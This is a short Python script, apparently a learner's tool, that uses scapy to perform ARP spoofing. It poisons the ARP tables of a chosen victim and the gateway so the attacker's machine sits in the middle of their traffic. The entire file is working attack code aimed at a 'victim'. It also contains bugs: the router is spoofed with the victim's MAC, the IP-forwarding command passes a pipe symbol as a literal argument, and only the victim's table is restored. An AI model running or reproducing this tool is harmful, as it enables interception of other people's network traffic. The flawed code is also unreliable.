#!/usr/bin/env python
# port forwarding cmd(as root user) :  echo 1 > /proc/sys/net/ipv4/ip_forward
import sys
import time
import scapy.all as scapy
import subprocess
import re
# op=2 : generate a response , pdst : ip add of victim , hwdst : mac add of victim , psrc : ip add of router gateway
# tell victim that we are router associate our system's mac add with ip of router

def get_mac_addresses(target_ip):
    output = subprocess.check_output(["arp", "-n"]).decode() # get arp table data
    devices={}
    for line in output.splitlines():
        ip = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", line)
        mac = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", line)
        if ip and mac:
            #ip1 = re.search(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", str(ip))
            #mac1 = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", str(mac))
            ip1 = ip.group(0)
            mac1 = mac.group(0)
            devices[ip1]=mac1
    return devices[target_ip]  # return mac address of speicified ip from arp table data in dictionary

# target ip : ip add of victim , target mac : mac add of victim , spoof ip : ip add of gateway, spoof mac : mac add of gateway
def spoof(target_ip, spoof_ip, target_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)
# change arp table of victim so that for victim ip of gateway gets associated to original mac of gateway
def restore(target_ip, spoof_ip, target_mac, spoof_mac):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
    scapy.send(packet, verbose=False)




def main():
    target_ip = input("enter target ip : ")
    spoof_ip = input("enter spoof ip : ")
    target_mac = get_mac_addresses(target_ip)
    spoof_mac = get_mac_addresses(spoof_ip)
    # enable port forwarding to automatically forward packets recieved from victim to gateway of router
    subprocess.run(["echo", "1", "|", "sudo", "tee", "/proc/sys/net/ipv4/ip_forward"])
    packets_sent = 0
    try:
        while True:
            # change arp table of victim so that for victim the ip of gateway gets associated to our mac add
            # victim thinks we are router
            spoof(target_ip, spoof_ip, target_mac)
            # change arp table of router so that for router victim ip gets associated to our mac
            # router thinks we are victim
            spoof(spoof_ip, target_ip, target_mac)
            packets_sent += 2
            print("\r [+] packets sent : ", packets_sent, end="")
            time.sleep(0.7)
    except KeyboardInterrupt:   # detect when we stop spoofing to prevent showing original error
        print("\n Detected Ctrl+C . . . Quitting ...")
        print("\n restoring arp tables of target and router . . . ")
        # restore arp tables for victim
        restore(target_ip, spoof_ip, target_mac, spoof_mac)


if __name__ == "__main__":
    main()


